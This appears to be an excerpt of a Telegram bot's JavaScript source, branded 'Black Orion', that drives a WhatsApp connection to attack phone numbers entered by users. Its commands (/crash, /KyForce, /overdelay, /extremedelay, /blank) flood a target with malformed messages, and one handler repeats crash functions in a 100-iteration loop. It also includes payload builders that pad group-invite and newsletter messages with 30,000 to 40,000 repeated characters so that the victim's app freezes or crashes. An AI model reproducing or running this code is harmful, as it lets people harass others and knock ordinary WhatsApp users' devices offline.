...
const thumbnailUrl = "https://files.catbox.moe/qai5h8.jpg";

const thumbnailVideo = "https://files.catbox.moe/qai5h8.jpg";
...
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
    ...
    sock.ev.on('connection.update', (update) => {
        ...
        const connectedMenu = `
<pre><code class="language-javascript">⟡━⟢ 𝗕𝗟𝗔𝗖𝗞 ☇ 𝗢𝗥𝗜𝗢𝗡 ⟣━⟡</code></pre>
...
bot.command("addbot", async (ctx) => {
  ...
  try {
    ...
    const code = await sock.requestPairingCode(phoneNumber, "RIDZZ123");
...
bot.use(async (ctx, next) => {
  ...
  try {
    ...
    if (tokens.includes(tokenBot)) {
      ...
      await sleep(500);
      await ctx.replyWithPhoto("https://files.catbox.moe/qai5h8.jpg", {
        caption:
...
🌙 Page 3/6 🌙</code></pre>`;
    ...
    const keyboard = [
        [
            { text: "TRASH FOR MURBUG", callback_data: "BebasSpam_bug" }
            { text: "TRASH NORMAL", callback_data: "Visible_Bug" }
            { text: "◀️", callback_data: "menu_controls" },
            { text: "Home", callback_data: "menu_home" },
...
// MENU BUG INVISIBLE
// ======================
bot.action('BebasSpam_bug', async (ctx) => {
    const bugMenu = `
<pre><code class="language-javascript">
🌙 TRASH FOR MURBUG 🌙
...
⬡═―—⊱ DELAY TYPE ⊰―—═⬡
  ...
  /KyForce    - 628xx [ FORCLOSE BEBAS SPAM ]
  /overdelay    - 628xx [ DELAY SUPER BRUTAL ]
  /extremedelay - 628xx [ DELAY HARD BANGET ]
...
⬡═―—⊱ VISIBLE TYPE ⊰―—═⬡
  /crash    - 628xx [ CRASH NO CLICK UI ]
  /blank     - 628xx [ BLANK 1 MSG ]
...
const GITHUB_RAW = 'https://raw.githubusercontent.com/anything-101/Autoup/main/index.js'
...
bot.command('pullupdate', async (ctx) => {
  ...
  try {
    ...
    if (localHash === remoteHash) {
      return ctx.reply('ANDA SUDAH VERSI YANG TERBARU❗️')
    }
    ...
    await ctx.reply('MOHON TUNGGU SEBENTAR,BOT TELAH MENEMUKAN FILE TERBARU✅\nBOT RESTART OTOMATIS 😋')
...
if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  ...
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗕𝗟𝗔𝗖𝗞 ☇ 𝗢𝗥𝗜𝗢𝗡 ⟣━⟡
⌑ Target: ${q}
...
bot.command("KyForce", checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /KyForce  62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
...
bot.command("crash", checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
...
╘═——————————————═⬡</code></pre>`,
  ...
  for (let i = 0; i < 100; i++) {
    await VsxIn(sock, target);
    await VsxIn(sock, target);
    await VsxIn(sock, target);
    await VsxIn(sock, target);
    await DelayCrash(sock, target);
    await sleep(1000);
  }
...
bot.command("overdelay", checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
...
bot.command("extremedelay", checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
...
bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      ...
      const processMsg = await ctx.telegram.sendPhoto(
        ...
        { url: thumbnailUrl },
        {
          caption: `<pre><code class="language-javascript">⟡━⟢ 𝗕𝗟𝗔𝗖𝗞 ☇ 𝗢𝗥𝗜𝗢𝗡 ⟣━⟡
⌑ Target: ${q}
...
╘═——————————————═⬡</code></pre>`,
      ...
      const finalText = `<pre><code class="language-javascript">⟡━⟢ 𝗕𝗟𝗔𝗖𝗞 ☇ 𝗢𝗥𝗜𝗢𝗡 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success
╘═——————————————═⬡</code></pre>`
...
async function VsxIn(sock, target) {
  try {
    null.getClass();
  } catch(e) {
    await sock.relayMessage(target, {
...
async function DelayCrash(sock, target) {
  let start = Date.now();
...
async function RxVzVsxDemonic(sock, target) {
    const groupJid = "1234567890-123456@g.us"
    const inviteCode = "AbCdEfGhIjKlMn"
    const newsletterJid = "123456789@newsletter"
    const inviteExpiration = Math.floor(Date.now() / 1000) + 86400
    const groupMsg = generateWAMessageFromContent(
        ...
        proto.Message.fromObject({
            groupInviteMessage: {
                ...
                caption: "⃟𝐑𝐱𝐕𝐳-𝐕𝐬𝐱 ⃟" + "ꦽ".repeat(30000)
            }
        }),
        {}
    )
    ...
    const newsletterMsg = generateWAMessageFromContent(
        ...
        proto.Message.fromObject({
            newsletterAdminInviteMessage: {
                ...
                caption: "⃟𝐑𝐱𝐕𝐳-𝐕𝐬𝐱 ⃟" + "ꦽ".repeat(40000),
                inviteExpiration
            }
        }),
        {}
